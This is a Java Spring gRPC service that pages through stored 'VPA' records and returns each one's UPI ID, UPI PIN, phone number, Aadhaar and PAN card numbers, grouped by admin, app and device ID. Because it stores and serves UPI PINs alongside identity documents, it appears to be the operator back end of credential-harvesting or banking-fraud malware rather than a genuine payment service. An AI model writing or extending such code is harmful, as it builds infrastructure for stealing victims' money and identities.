package app.service.grpc;

import app.service.grpc.vpa.ListVpaRequest;
import app.service.grpc.vpa.ListVpaResponse;
import app.service.grpc.vpa.VpaItem;
import app.service.grpc.vpa.VpaServiceGrpc;
import app.service.model.VpaRecord;
import app.service.store.VpaQuery;
import app.service.store.VpaStore;
import io.grpc.stub.StreamObserver;
import org.springframework.stereotype.Service;

import java.util.List;
import java.util.Objects;

@Service
public class VpaGrpcService extends VpaServiceGrpc.VpaServiceImplBase {

    private final VpaStore store;

    public VpaGrpcService(VpaStore store) { this.store = store; }

    @Override
    public void listVpa(ListVpaRequest request, StreamObserver<ListVpaResponse> responseObserver) {
        try {
            VpaQuery q = new VpaQuery();
            q.setAdminId(Objects.toString(request.getAdminId(), ""));
            q.setAppId(Objects.toString(request.getAppId(), ""));
            if (!request.getDeviceId().isBlank()) q.setDeviceId(request.getDeviceId());
            if (!request.getQ().isBlank()) q.setQ(request.getQ());
            q.setPage(Math.max(0, request.getPage()));
            q.setSize(Math.max(1, Math.min(200, request.getSize())));

            List<VpaRecord> rows = store.list(q);
            int count = store.count(q);

            var b = ListVpaResponse.newBuilder().setPage(q.getPage()).setSize(q.getSize()).setCount(count);
            for (var v : rows) b.addItems(toProto(v));
            responseObserver.onNext(b.build());
            responseObserver.onCompleted();
        } catch (Exception e) {
            responseObserver.onError(e);
        }
    }

    private VpaItem toProto(VpaRecord v) {
        VpaItem.Builder b = VpaItem.newBuilder()
                .setId(v.getId()==null?0:v.getId())
                .setAdminId(nz(v.getAdminId()))
                .setAppId(nz(v.getAppId()))
                .setDeviceId(nz(v.getDeviceId()))
                .setUpiId(nz(v.getUpiId()))
                .setEventTimestampMs(v.getEventTimestampMs()==null?0:v.getEventTimestampMs());
        if (v.getUpiPin()!=null) b.setUpiPin(v.getUpiPin());
        if (v.getPhoneNumber()!=null) b.setPhoneNumber(v.getPhoneNumber());
        if (v.getAdharCard()!=null) b.setAdharCard(v.getAdharCard());
        if (v.getPanCard()!=null) b.setPanCard(v.getPanCard());
        return b.build();
    }

    private static String nz(String s){ return s==null?"":s; }
}
